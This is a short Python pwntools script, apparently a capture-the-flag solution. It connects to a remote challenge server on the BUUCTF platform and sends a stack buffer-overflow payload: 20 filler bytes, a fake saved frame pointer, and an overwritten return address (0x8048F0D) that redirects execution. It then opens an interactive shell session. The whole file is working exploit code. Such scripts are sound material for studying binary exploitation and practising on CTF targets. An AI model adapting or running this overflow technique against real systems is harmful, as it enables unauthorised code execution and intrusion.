from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',26677)

payload=b'I'*20+p32(0xdeadbeef)+p32(0x8048F0D)

p.sendline(payload)

p.interactive()
